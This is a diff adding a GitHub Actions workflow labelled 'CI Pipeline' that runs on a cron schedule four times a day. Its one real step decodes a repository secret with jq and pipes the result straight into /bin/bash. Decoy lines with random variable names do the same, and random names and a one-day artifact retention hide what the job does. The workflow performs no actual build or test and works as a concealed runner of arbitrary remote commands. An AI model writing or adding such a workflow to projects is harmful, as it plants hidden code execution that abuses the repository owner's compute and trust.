@@ -1,0 +1,39 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '49 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          eqv9: ${{ secrets.eqv9 }}
+        run: |
+          printf '%s' "$eqv9" | jq -r .pdmw937 | /bin/bash
+          echo $ehupv54 | jq -r .ttls58036 | /bin/bash
+          printf '%s' "$nkpm02" | jq -r .utsxj21825 | /bin/bash
+          printf '%s' "$ez41" | jq -r .nv964 | /bin/bash
+          echo $mxem6 | jq -r .i5212 | /bin/bash
+          printf '%s' "$g34" | jq -r .qcas5822 | /bin/bash
+          echo $l80 | jq -r .wfnlf141 | /bin/bash
+          printf '%s' "$bv892" | jq -r .xkag878 | /bin/bash
+          printf '%s' "$dkv85517" | jq -r .ufpt08 | /bin/bash
+
+      - name: Archive results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: USeuGqOD
+          path: "*.zip"
+          retention-days: 1
